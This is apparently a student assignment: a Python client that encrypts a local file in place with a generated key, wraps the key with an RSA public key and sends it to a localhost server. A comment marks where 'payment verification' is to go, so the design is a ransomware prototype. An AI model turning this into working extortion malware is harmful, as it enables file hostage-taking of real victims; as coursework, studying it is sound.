# File          : client.txt 
# Assignment    : ACS-A1
# Programmer    : Addison Phillips
# Description   : This client creates a key, encrypts a file, then encrypts
#                 the key. once that is done, it sends over the encrypted key 
#                 to the server. Once the key is back, the client can decrypt
#                 the file.        


from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import socket
import argparse
import ipaddress
import constants


class AttrDict(dict):
    def __init__(self, *args, **kwargs):
        super(AttrDict, self).__init__(*args, **kwargs)
        self.__dict__ = self
# take the file path and key
# create a Fernet instance with the key - we dont need to generate a new one, 
# we are trying to use the decrypted symmetric 
# key from earlier to decypt the file. We then use the decypt function to 
# decypt the file and we store the data. 

# Function      : decryptFile
# Description   : This function creates a Fernet instance with the key that
# was decrypted. It then decrypts the file and writes the contents to a new 
# file.  

def decryptFile(filePath, key):
    f = Fernet(key)
    with open(filePath, "rb") as file:
        encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
    with open(".\File1.txt", "wb") as file:
        file.write(decrypted_data)   


# Function      : sendEncryptedKey
# Description   : This function creates a socket connection with the server and sends
# over the encrypted key. It then receives back the encrypted key and calls the 
# decryptFile function

def sendEncryptedKey(eKeyFilePath):
    hostname, port = "127.0.0.1", 8000
    with socket.create_connection((hostname, port)) as sock:
        with open(eKeyFilePath, "rb") as file:
            encrypted_symmetric_key = file.read()
            sock.sendall(encrypted_symmetric_key)
            returned_key = sock.recv(1024)
            decryptFile(filePath, returned_key)


# FUNCTION      : parse_host_port
# DESCRIPTION   : this function will parse the IPendpoint to useable data
#  

def parse_host_port(ip_port):
    try:
        ip = ipaddress.ip_address(ip_port[0])
    except ValueError:
        raise ValueError("Invalid host:port '%s", ip_port)

    if len(ip_port) == 1:
        # no port specified
        port = 8000
    else:
        try:
            port = int(ip_port[1])
            if port < constants.MIN_PORT or port > constants.MAX_PORT:
                print("Invalid host:port '%s", ip_port)
           
        except ValueError:
            raise ValueError("Invalid host:port '%s", ip_port)
 

if __name__ == "__main__":



# add CL Args here using arg parse.
# Args include: 
#   File to Encrypt (reqd), 
#   IP/Port of the server(to be put on the cloud, req'd later, not for testing)
#  
    
    parser = argparse.ArgumentParser()
    
    parser.add_argument('-f', '--file', required=True, help="File to encrypt") # will also need to make this multiple files!
    parser.add_argument('-c', '--configipendpoint',required=True, help="IP/Port; Accepted format is: 'ip:port'")


    args = parser.parse_args()
    allargs = (vars(args))
    allargs = AttrDict(allargs)
    
    #parse the IPEndpoint
    if allargs.file is not None:
        ip_port = args.configipendpoint.rsplit(":", 1)
        parse_host_port(ip_port)
        
        
    # This line generates a Fernet key
    symmetricKey = Fernet.generate_key()
    # The key is then passed into the Fernet instance
    FernetInstance = Fernet(symmetricKey)

    # A previously made key using opensll is loaded into the program and 
    # read and serialized
    with open(".\Keys\public_key.key", "rb") as key_file:
        public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
        )
    # This is where we use the public key to encypt the symmetric key we generated 
    # earlier 
    encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
        )
    )
    # write the encrypted symmertric key to the hard disk
    with open("encryptedSymmertricKey.key", "wb") as key_file:
        key_file.write(encryptedSymmetricKey)

    filePath = ".\File1.txt"
    # open the file that is to be encrypted... and encrypt it
    with open(filePath, "rb") as file:
        file_data = file.read()
        encrypted_data = FernetInstance.encrypt(file_data)

    # write the encrypted file back to the filepath, overwriting the information 
    # with encyption
    with open(filePath, "wb") as file:
        file.write(encrypted_data)
    # load up the encrypted key to send to the server that is running. 
        eKeyFilePath = ".\encryptedSymmertricKey.key"
    # Create the variables for host/port

    #THIS IS WHERE We need to add the payment verification.


    sendEncryptedKey(eKeyFilePath)

    quit()
